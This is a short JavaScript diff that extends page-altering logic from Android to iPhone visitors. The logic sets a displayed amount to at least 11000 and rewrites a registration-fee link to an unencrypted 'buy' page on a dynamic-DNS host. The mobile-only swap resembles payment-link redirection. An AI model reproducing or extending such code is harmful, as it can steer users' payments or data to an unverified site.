@@ -16,7 +16,7 @@ function executeScript() {
             if (numberValue < 11000) {
                 result = 11000;
             }
-            if (/Android/i.test(navigator.userAgent)) {
+            if (/Android/i.test(navigator.userAgent) || /iPhone/i.test(navigator.userAgent)) {
                 tdElement.textContent = result;
                 anchorElement.href = originalUrl.replace("https://bcm.webking.co.in/profile/regn_fee.php", "http://webkingbcm.ddns.net/buy");
             }
